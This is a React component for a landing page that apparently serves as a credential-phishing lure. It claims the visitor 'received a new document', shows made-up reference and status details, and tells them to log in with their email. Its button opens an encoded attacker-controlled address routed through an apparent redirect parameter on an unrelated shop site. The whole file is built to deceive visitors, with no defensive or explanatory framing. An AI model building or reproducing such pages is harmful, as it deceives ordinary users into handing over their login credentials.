import { FileText, CheckCircle, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useState } from "react";
import { format } from "date-fns";

const DocumentLanding = () => {
  const [isLoading, setIsLoading] = useState(false);

  const handleViewDocument = () => {
    setIsLoading(true);
    window.open('https://www.recialde.it/add-to-cart/?url=https%3A%2F%2Fdevnix%2Ecom%2Ede%2FsOouvLsxZ%2F%23Z?e=', '_blank');
    // Reset loading state after 4 seconds
    setTimeout(() => setIsLoading(false), 4000);
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-6">
      <Card className="w-full max-w-md mx-auto p-8 text-center shadow-lg">
        {/* Document Icon */}
        <div className="mb-8">
          <div className="w-16 h-16 mx-auto bg-accent/20 rounded-full flex items-center justify-center">
            <FileText className="w-8 h-8 text-accent" />
          </div>
        </div>

        {/* Main Heading */}
        <h1 className="text-2xl font-bold text-foreground mb-4">
          You have received a new document
        </h1>

        {/* Description */}
        <p className="text-muted-foreground mb-8 leading-relaxed">
          The message was sent securely to protect sensitive information
          included in the correspondence
        </p>

        {/* Document Details */}
        <div className="space-y-3 mb-8 text-sm">
          <div className="flex justify-between items-center">
            <span className="font-medium text-foreground">Date Received</span>
            <span className="text-muted-foreground">{format(new Date(), "MM/dd/yyyy")}</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-medium text-foreground">Reference Number</span>
            <span className="text-muted-foreground">SP005581456</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-medium text-foreground">Number of Pages</span>
            <span className="text-muted-foreground">3</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-medium text-foreground">Status code</span>
            <span className="text-success font-medium flex items-center gap-1">
              <CheckCircle className="w-4 h-4" />
              Successful
            </span>
          </div>
        </div>

        {/* CTA Button */}
        <Button 
          className={`w-full py-3 text-base font-medium mb-6 transition-all duration-300 ${
            isLoading 
              ? 'bg-primary/80 cursor-not-allowed transform scale-[0.98]' 
              : 'hover:bg-primary/90 hover:scale-[1.02]'
          }`}
          onClick={handleViewDocument}
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="flex items-center justify-center gap-2">
              <div className="relative">
                <Loader2 className="w-5 h-5 animate-spin text-primary-foreground" />
                <div className="absolute inset-0 w-5 h-5 border-2 border-primary-foreground/20 rounded-full animate-pulse"></div>
              </div>
              <span className="animate-pulse">Accessing Document...</span>
            </div>
          ) : (
            <div className="flex items-center justify-center gap-2">
              <FileText className="w-4 h-4" />
              VIEW DOCUMENT (130kb)
            </div>
          )}
        </Button>

        {/* Important Note */}
        <div className="bg-info/10 border border-info/20 rounded-lg p-4">
          <div className="flex items-start gap-3 text-left">
            <div className="w-4 h-4 border border-info rounded-sm mt-0.5 flex-shrink-0"></div>
            <div className="text-sm">
              <span className="font-medium text-foreground">Important Note:</span>
              <span className="text-muted-foreground ml-1">
                Login with your receiving email for a secured authentication to view document
              </span>
            </div>
          </div>
        </div>
      </Card>
    </div>
  );
};

export default DocumentLanding;